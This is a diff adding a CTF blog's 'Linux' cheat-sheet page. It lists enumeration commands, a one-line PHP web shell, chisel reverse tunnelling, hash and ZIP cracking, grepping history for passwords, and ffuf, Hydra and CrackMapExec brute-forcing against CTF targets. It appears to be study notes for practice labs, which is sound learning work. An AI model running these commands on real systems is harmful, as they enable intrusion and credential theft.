@@ -1,0 +1,200 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Linux // 53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.fded3e7c63aff6aa1db01d26ec4f3baf51e0c0016a8d266e082f7cfbd18d15d5.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Linux"/>
+<meta name="twitter:description" content="View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&gt;/dev/null PHP WebShell &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null find ."/>
+
+    <meta property="og:title" content="Linux" />
+<meta property="og:description" content="View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&gt;/dev/null PHP WebShell &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null find ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/notes/linux-notes/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-07T09:33:57+05:30" />
+<meta property="article:modified_time" content="2023-01-07T09:33:57+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
+      <span class="app-header-title">53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Linux</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 7, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/notes/">Notes</a>
+              <a class="tag" href="https://53ctf.github.io/tags/linux/">Linux</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="view-cron-jobs">View Cron Jobs</h3>
+<pre tabindex="0"><code>crontab -l
+</code></pre><h3 id="list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</h3>
+<pre tabindex="0"><code>systemctl list-timers
+</code></pre><h3 id="view-nfs-network-file-share">View NFS (Network File Share)</h3>
+<pre tabindex="0"><code>showmount REMOTE_IP -e
+</code></pre><h3 id="mount-nfs">Mount NFS</h3>
+<pre tabindex="0"><code>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
+</code></pre><h3 id="crack-zip-files">Crack ZIP Files</h3>
+<pre tabindex="0"><code>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
+</code></pre><h3 id="find-suid-binaries">Find SUID Binaries</h3>
+<pre tabindex="0"><code>find / -type f -perm -4000 2&gt;/dev/null
+</code></pre><h3 id="php-webshell">PHP WebShell</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h3 id="smb-shares">SMB Shares</h3>
+<pre tabindex="0"><code>smbmap -H REMOTE_IP -u USERNAME
+</code></pre><h3 id="basic-chisel-port-forwarding">Basic Chisel Port Forwarding</h3>
+<h4 id="server">Server</h4>
+<pre tabindex="0"><code>./chisel server --reverse --port LOCAL_PORT
+</code></pre><h4 id="client">Client</h4>
+<pre tabindex="0"><code>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
+</code></pre><h3 id="find-open-ports">Find Open Ports</h3>
+<pre tabindex="0"><code>netstat -tupln
+</code></pre><h3 id="oskernel-information">OS/Kernel Information</h3>
+<pre tabindex="0"><code>uname -a
+cat /proc/version
+cat /etc/issue
+</code></pre><h3 id="cpu-information">CPU Information</h3>
+<pre tabindex="0"><code>lscpu
+</code></pre><h3 id="identifying-the-network-route">Identifying the Network Route</h3>
+<pre tabindex="0"><code>route
+ip route
+</code></pre><h3 id="discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</h3>
+<pre tabindex="0"><code>arp -a
+ip neigh
+</code></pre><h3 id="look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</h3>
+<pre tabindex="0"><code>grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &#34;STRING_THAT_WANT_BE_FOUND&#34; {} /dev/null \;
+</code></pre><h3 id="find-passwords-in-history">Find Passwords in History</h3>
+<pre tabindex="0"><code>cat ~/.bash_history | grep -i passw
+</code></pre><h3 id="cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</h3>
+<pre tabindex="0"><code>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
+hashcat -m 1800 unshadowed.txt /PATH/TO/WORDLIST -O
+</code></pre><h3 id="nslookup">NSLookup</h3>
+<p>nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.</p>
+<pre tabindex="0"><code>nslookup -type=any DOMAIN.COM
+</code></pre><h3 id="dnsrecon">DNSRecon</h3>
+<p>DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.</p>
+<pre tabindex="0"><code>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
+</code></pre><h3 id="git-dumper">Git-Dumper</h3>
+<p>A tool to dump a git repository from a website.</p>
+<pre tabindex="0"><code>git-dumper http://SITENAME.COM/.git
+</code></pre><h3 id="ldapsearch">LDAPSearch</h3>
+<p>LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.</p>
+<pre tabindex="0"><code>ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39;
+ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39; | grep name: | sed &#39;s/^name: //&#39; | grep -vE &#39;D|C|A|U&#39; &gt; /PATH/TO/USERNAMES/WORDLIST
+</code></pre><h3 id="whatweb">WhatWeb</h3>
+<p>WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
+<pre tabindex="0"><code>whatweb https://DOMAIN/
+</code></pre><h3 id="arpscan">ARPScan</h3>
+<p>ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.</p>
+<pre tabindex="0"><code>sudo arp-scan -l
+</code></pre><h3 id="netdiscover">NetDiscover</h3>
+<p>Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.</p>
+<pre tabindex="0"><code>sudo netdiscover -r IP/24
+</code></pre><h3 id="smbclient">SMBClient</h3>
+<p>SMBCLIENT is a client that can &rsquo;talk&rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.</p>
+<pre tabindex="0"><code>smbclient -L \\\\REMOTE_IP\\
+</code></pre><h3 id="ssh">SSH</h3>
+<p>OpenSSH is the premier connectivity tool for remote login with the SSH protocol.</p>
+<pre tabindex="0"><code>ssh REMOTE_IP -o KexAlgorithms=+diffie-helman-group1-sha1 -c aex128-cbc
+</code></pre><h3 id="evil-winrm">Evil-WinRM</h3>
+<p>This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.</p>
+<pre tabindex="0"><code>evil-winrm -i IP_ADDRESS -u username -p password
+</code></pre><h3 id="ffuf">FFUF</h3>
+<p>ffuf · Fast web fuzzer written in Go.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H &#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -t 1 -p 0.1 -mc all -fc 404 -c
+</code></pre><p>It can be also used to brute-force login forms.</p>
+<pre tabindex="0"><code>ffuf -w ~/wordlists/usernames.txt -X POST -d &#34;username=FUZZ&amp;password=x&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Username is invalid&#39;
+ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FUZZ&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Password is invalid&#39;
+</code></pre><p>And also for id fuzzing.</p>
+<pre tabindex="0"><code>seq 1 100 | ffuf -w - -t 1 -p 0.1 -H &#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34; -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404
+</code></pre><h3 id="crackmapexec">CrackMapExec</h3>
+<p>This package is a swiss army knife for pentesting Windows/Active Directory environments.</p>
+<pre tabindex="0"><code>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
+</code></pre><h3 id="hydra">Hydra</h3>
+<p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</p>
+<p><strong>Brute-forcing SSH with HYDRA.</strong></p>
+<pre tabindex="0"><code>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t 4 -V
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
